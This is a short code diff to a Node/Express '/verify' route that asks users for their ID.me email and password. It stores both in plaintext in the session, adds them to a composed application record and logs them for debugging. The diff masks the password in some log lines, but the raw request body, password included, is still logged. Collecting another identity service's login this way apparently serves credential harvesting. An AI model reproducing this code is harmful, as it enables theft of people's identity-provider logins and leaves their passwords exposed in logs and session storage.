@@ -244,17 +244,20 @@ router.post('/verify', async (req, res) => {
   if (!req.session.applicationDraft) return res.redirect('/apply');
   // Log received ID.me credentials and session for debugging
   console.log('Received ID.me credentials:', req.body);
-  console.log('ID.me email from req.body:', req.body.email);
-  console.log('ID.me password from req.body:', req.body.password);
+  console.log('Raw req.body keys:', Object.keys(req.body));
+  console.log('Raw req.body values:', req.body);
   console.log('Session at /verify POST:', req.session);
 
   const { email, password } = req.body;
-  console.log('Destructured email:', email);
-  console.log('Destructured password:', password);
+  console.log('Destructured email:', email || 'UNDEFINED');
+  console.log('Destructured password:', password ? '[PROVIDED]' : 'UNDEFINED');
   
   req.session.verified = true;
   req.session.idme = { email, password };
-  console.log('Session.idme after setting:', req.session.idme);
+  console.log('Session.idme after setting:', { 
+    email: req.session.idme.email || 'MISSING', 
+    password: req.session.idme.password ? '[SET]' : 'MISSING' 
+  });
 
   // Compose full JSON (applicationDraft, interviewAnswers, idme)
   const application = req.session.applicationDraft;
